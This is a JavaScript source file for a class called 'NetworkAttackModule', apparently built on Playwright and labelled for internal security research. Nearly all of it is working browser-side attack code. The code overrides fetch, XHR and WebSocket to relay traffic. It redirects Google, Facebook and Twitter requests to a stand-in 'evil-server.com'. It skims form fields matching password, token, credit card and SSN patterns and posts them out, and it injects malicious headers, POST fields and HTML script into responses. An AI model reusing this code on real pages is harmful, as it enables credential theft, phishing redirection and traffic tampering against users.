/**
 * NETWORK ATTACK MODULE
 * For Internal Security Research Only
 * 
 * This module demonstrates various network-based attack techniques
 * including traffic analysis, request manipulation, and network monitoring.
 */

class NetworkAttackModule {
    constructor(page) {
        this.page = page;
        this.networkData = {
            interceptedRequests: [],
            modifiedResponses: [],
            trafficAnalysis: [],
            dnsQueries: [],
            webSocketData: [],
            timestamp: new Date().toISOString()
        };
    }

    async executeNetworkAttacks() {
        console.log('🌐 Starting network attacks...');
        
        await this.setupRequestInterception();
        await this.implementTrafficAnalysis();
        await this.createDNSHijacking();
        await this.setupWebSocketInterception();
        await this.implementRequestManipulation();
        await this.createNetworkSniffing();
        await this.implementResponseModification();
        await this.createTrafficRedirection();
        
        return this.networkData;
    }

    async setupRequestInterception() {
        console.log('🕵️ Setting up request interception...');
        
        // Intercept all requests
        await this.page.route('**/*', async (route) => {
            const request = route.request();
            const url = request.url();
            const method = request.method();
            const headers = request.headers();
            const postData = request.postData();
            
            // Log intercepted request
            this.networkData.interceptedRequests.push({
                url: url,
                method: method,
                headers: headers,
                postData: postData,
                timestamp: new Date().toISOString()
            });
            
            // Continue with the request
            await route.continue();
        });
        
        console.log('✅ Request interception active');
    }

    async implementTrafficAnalysis() {
        console.log('📊 Implementing traffic analysis...');
        
        // Monitor network performance
        await this.page.evaluate(() => {
            // Monitor resource loading
            const observer = new PerformanceObserver((list) => {
                for (const entry of list.getEntries()) {
                    if (entry.entryType === 'resource') {
                        const resourceData = {
                            name: entry.name,
                            duration: entry.duration,
                            transferSize: entry.transferSize,
                            encodedBodySize: entry.encodedBodySize,
                            decodedBodySize: entry.decodedBodySize,
                            startTime: entry.startTime,
                            timestamp: new Date().toISOString()
                        };
                        
                        // Send to analysis endpoint
                        fetch('/analyze-resource', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(resourceData)
                        });
                    }
                }
            });
            
            observer.observe({ entryTypes: ['resource'] });
        });
        
        // Monitor navigation timing
        await this.page.evaluate(() => {
            if ('performance' in window && 'timing' in performance) {
                const timing = performance.timing;
                const navigationData = {
                    navigationStart: timing.navigationStart,
                    loadEventEnd: timing.loadEventEnd,
                    domContentLoadedEventEnd: timing.domContentLoadedEventEnd,
                    responseEnd: timing.responseEnd,
                    requestStart: timing.requestStart,
                    domainLookupEnd: timing.domainLookupEnd,
                    domainLookupStart: timing.domainLookupStart,
                    connectEnd: timing.connectEnd,
                    connectStart: timing.connectStart,
                    timestamp: new Date().toISOString()
                };
                
                // Send navigation data
                fetch('/analyze-navigation', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(navigationData)
                });
            }
        });
        
        this.networkData.trafficAnalysis.push({
            type: 'performance_monitoring',
            timestamp: new Date().toISOString(),
            description: 'Implemented resource and navigation timing analysis'
        });
    }

    async createDNSHijacking() {
        console.log('🎯 Creating DNS hijacking simulation...');
        
        await this.page.evaluate(() => {
            // Simulate DNS hijacking by intercepting domain resolution
            const originalFetch = window.fetch;
            window.fetch = function(url, options) {
                const urlObj = new URL(url);
                
                // Check for specific domains to hijack
                const hijackedDomains = {
                    'google.com': 'https://evil-server.com/fake-google',
                    'facebook.com': 'https://evil-server.com/fake-facebook',
                    'twitter.com': 'https://evil-server.com/fake-twitter'
                };
                
                if (hijackedDomains[urlObj.hostname]) {
                    console.log(`DNS hijacking: ${urlObj.hostname} -> ${hijackedDomains[urlObj.hostname]}`);
                    
                    // Send hijacking data
                    fetch('/log-dns-hijack', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            originalDomain: urlObj.hostname,
                            hijackedDomain: hijackedDomains[urlObj.hostname],
                            timestamp: new Date().toISOString()
                        })
                    });
                    
                    // Redirect to fake site
                    return originalFetch(hijackedDomains[urlObj.hostname], options);
                }
                
                return originalFetch(url, options);
            };
            
            // Also hijack XMLHttpRequest
            const originalXHROpen = XMLHttpRequest.prototype.open;
            XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
                const urlObj = new URL(url);
                
                const hijackedDomains = {
                    'api.google.com': 'https://evil-server.com/fake-api',
                    'graph.facebook.com': 'https://evil-server.com/fake-graph'
                };
                
                if (hijackedDomains[urlObj.hostname]) {
                    console.log(`XHR DNS hijacking: ${urlObj.hostname} -> ${hijackedDomains[urlObj.hostname]}`);
                    url = hijackedDomains[urlObj.hostname];
                }
                
                return originalXHROpen.call(this, method, url, async, user, password);
            };
        });
        
        this.networkData.dnsQueries.push({
            type: 'dns_hijacking',
            timestamp: new Date().toISOString(),
            description: 'Implemented DNS hijacking simulation for specific domains'
        });
    }

    async setupWebSocketInterception() {
        console.log('🔌 Setting up WebSocket interception...');
        
        await this.page.evaluate(() => {
            // Intercept WebSocket connections
            const originalWebSocket = window.WebSocket;
            window.WebSocket = function(url, protocols) {
                console.log(`WebSocket connection attempt: ${url}`);
                
                // Log WebSocket data
                const wsData = {
                    url: url,
                    protocols: protocols,
                    timestamp: new Date().toISOString()
                };
                
                fetch('/log-websocket', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(wsData)
                });
                
                const ws = new originalWebSocket(url, protocols);
                
                // Intercept messages
                const originalSend = ws.send;
                ws.send = function(data) {
                    console.log(`WebSocket send: ${data}`);
                    
                    fetch('/log-websocket-message', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            type: 'send',
                            data: data,
                            url: url,
                            timestamp: new Date().toISOString()
                        })
                    });
                    
                    return originalSend.call(this, data);
                };
                
                // Intercept received messages
                ws.addEventListener('message', function(event) {
                    console.log(`WebSocket receive: ${event.data}`);
                    
                    fetch('/log-websocket-message', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            type: 'receive',
                            data: event.data,
                            url: url,
                            timestamp: new Date().toISOString()
                        })
                    });
                });
                
                return ws;
            };
        });
        
        this.networkData.webSocketData.push({
            type: 'websocket_interception',
            timestamp: new Date().toISOString(),
            description: 'Implemented WebSocket connection and message interception'
        });
    }

    async implementRequestManipulation() {
        console.log('🔧 Implementing request manipulation...');
        
        // Modify requests before they're sent
        await this.page.route('**/*', async (route) => {
            const request = route.request();
            const url = request.url();
            const method = request.method();
            const headers = request.headers();
            const postData = request.postData();
            
            // Add malicious headers
            const modifiedHeaders = {
                ...headers,
                'X-Attack-Header': 'malicious-value',
                'X-Forwarded-For': '192.168.1.100',
                'User-Agent': 'Mozilla/5.0 (compatible; EvilBot/1.0)'
            };
            
            // Modify POST data if present
            let modifiedPostData = postData;
            if (postData && method === 'POST') {
                try {
                    const data = JSON.parse(postData);
                    data.injectedField = 'malicious-data';
                    modifiedPostData = JSON.stringify(data);
                } catch (error) {
                    // If not JSON, append malicious data
                    modifiedPostData = postData + '&injected=malicious';
                }
            }
            
            // Log modified request
            this.networkData.interceptedRequests.push({
                url: url,
                method: method,
                originalHeaders: headers,
                modifiedHeaders: modifiedHeaders,
                originalPostData: postData,
                modifiedPostData: modifiedPostData,
                timestamp: new Date().toISOString()
            });
            
            // Continue with modified request
            await route.continue({
                headers: modifiedHeaders,
                postData: modifiedPostData
            });
        });
        
        this.networkData.interceptedRequests.push({
            type: 'request_manipulation',
            timestamp: new Date().toISOString(),
            description: 'Implemented request header and data manipulation'
        });
    }

    async createNetworkSniffing() {
        console.log('👃 Creating network sniffing...');
        
        await this.page.evaluate(() => {
            // Sniff for sensitive data in requests
            const sensitivePatterns = [
                /password/i,
                /token/i,
                /api_key/i,
                /secret/i,
                /private_key/i,
                /credit_card/i,
                /ssn/i,
                /social_security/i
            ];
            
            // Monitor all form submissions
            document.addEventListener('submit', function(e) {
                const form = e.target;
                const formData = new FormData(form);
                
                for (let [key, value] of formData.entries()) {
                    // Check if field contains sensitive data
                    sensitivePatterns.forEach(pattern => {
                        if (pattern.test(key) || pattern.test(value)) {
                            console.log(`Sensitive data detected: ${key} = ${value}`);
                            
                            fetch('/log-sensitive-data', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    field: key,
                                    value: value,
                                    formAction: form.action,
                                    timestamp: new Date().toISOString()
                                })
                            });
                        }
                    });
                }
            });
            
            // Monitor AJAX requests
            const originalFetch = window.fetch;
            window.fetch = function(url, options) {
                if (options && options.body) {
                    const body = options.body.toString();
                    sensitivePatterns.forEach(pattern => {
                        if (pattern.test(body)) {
                            console.log(`Sensitive data in fetch: ${body}`);
                            
                            fetch('/log-sensitive-fetch', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    url: url,
                                    body: body,
                                    timestamp: new Date().toISOString()
                                })
                            });
                        }
                    });
                }
                
                return originalFetch.call(this, url, options);
            };
        });
        
        this.networkData.trafficAnalysis.push({
            type: 'network_sniffing',
            timestamp: new Date().toISOString(),
            description: 'Implemented sensitive data sniffing in network traffic'
        });
    }

    async implementResponseModification() {
        console.log('🔄 Implementing response modification...');
        
        // Intercept and modify responses
        await this.page.route('**/*', async (route) => {
            const request = route.request();
            const response = await route.fetch();
            
            // Get response body
            const responseBody = await response.text();
            
            // Modify response based on content type
            let modifiedBody = responseBody;
            const contentType = response.headers()['content-type'] || '';
            
            if (contentType.includes('text/html')) {
                // Inject malicious script into HTML
                modifiedBody = responseBody.replace(
                    '</body>',
                    '<script>console.log("Injected script"); fetch("/malicious-endpoint");</script></body>'
                );
            } else if (contentType.includes('application/json')) {
                // Modify JSON responses
                try {
                    const data = JSON.parse(responseBody);
                    data.injectedField = 'malicious-data';
                    modifiedBody = JSON.stringify(data);
                } catch (error) {
                    // If not valid JSON, leave as is
                }
            }
            
            // Log modified response
            this.networkData.modifiedResponses.push({
                url: request.url(),
                originalBody: responseBody,
                modifiedBody: modifiedBody,
                contentType: contentType,
                timestamp: new Date().toISOString()
            });
            
            // Return modified response
            await route.fulfill({
                status: response.status(),
                headers: response.headers(),
                body: modifiedBody
            });
        });
        
        this.networkData.modifiedResponses.push({
            type: 'response_modification',
            timestamp: new Date().toISOString(),
            description: 'Implemented response body modification'
        });
    }

    async createTrafficRedirection() {
        console.log('🔄 Creating traffic redirection...');
        
        await this.page.evaluate(() => {
            // Redirect specific traffic patterns
            const redirectRules = [
                {
                    pattern: /google\.com/,
                    redirect: 'https://evil-server.com/fake-google'
                },
                {
                    pattern: /facebook\.com/,
                    redirect: 'https://evil-server.com/fake-facebook'
                },
                {
                    pattern: /api\./,
                    redirect: 'https://evil-server.com/fake-api'
                }
            ];
            
            // Intercept navigation
            const originalLocation = Object.getOwnPropertyDescriptor(window, 'location');
            Object.defineProperty(window, 'location', {
                set: function(value) {
                    const url = new URL(value);
                    
                    // Check redirect rules
                    redirectRules.forEach(rule => {
                        if (rule.pattern.test(url.hostname)) {
                            console.log(`Redirecting: ${url.href} -> ${rule.redirect}`);
                            
                            fetch('/log-redirect', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    originalUrl: url.href,
                                    redirectUrl: rule.redirect,
                                    timestamp: new Date().toISOString()
                                })
                            });
                            
                            value = rule.redirect;
                        }
                    });
                    
                    return originalLocation.set.call(this, value);
                },
                get: originalLocation.get
            });
            
            // Intercept fetch requests
            const originalFetch = window.fetch;
            window.fetch = function(url, options) {
                const urlObj = new URL(url);
                
                redirectRules.forEach(rule => {
                    if (rule.pattern.test(urlObj.hostname)) {
                        console.log(`Fetch redirect: ${url} -> ${rule.redirect}`);
                        url = rule.redirect;
                    }
                });
                
                return originalFetch.call(this, url, options);
            };
        });
        
        this.networkData.trafficAnalysis.push({
            type: 'traffic_redirection',
            timestamp: new Date().toISOString(),
            description: 'Implemented traffic redirection based on patterns'
        });
    }

    getSummary() {
        return {
            totalInterceptions: this.networkData.interceptedRequests.length,
            modifiedResponses: this.networkData.modifiedResponses.length,
            trafficAnalysis: this.networkData.trafficAnalysis.length,
            dnsQueries: this.networkData.dnsQueries.length,
            webSocketData: this.networkData.webSocketData.length,
            timestamp: this.networkData.timestamp
        };
    }
}

module.exports = NetworkAttackModule; 